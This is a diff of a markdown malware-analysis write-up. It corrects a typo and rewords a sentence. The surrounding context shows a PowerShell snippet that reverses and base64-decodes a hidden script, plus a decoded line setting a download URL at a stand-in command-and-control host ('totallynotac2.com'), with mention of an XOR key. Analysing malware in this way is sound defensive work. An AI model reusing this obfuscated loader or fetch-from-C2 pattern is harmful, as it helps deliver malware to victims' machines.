@@ -29,7 +29,7 @@ $base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 
 $LoadCoDe = [SyStem.teXT.ENCODIng]::uTF8.GetSTRing([sysTeM.cONVeRT]::fRoMbAse64stRing("$BAsE64")) ; echo "$LoadCoDe";
 ```
 
-Now that we have decoded the "hidden" in plain sight script let's anylyze that:
+Now that we have decoded the "hidden" in plain sight script let's analyze that:
 
 ```
 $u = "http://totallynotac2.com/LegitProgram.exe"
@@ -78,7 +78,7 @@ try {
 }
 ```
 
-As we can see it initializes few variables that do the following:
+As we can see it initializes a few variables, makes a function and runs a few try-catch exceptions. Let's break it down step by step:
 
 - Put url in string
 - declare xor key
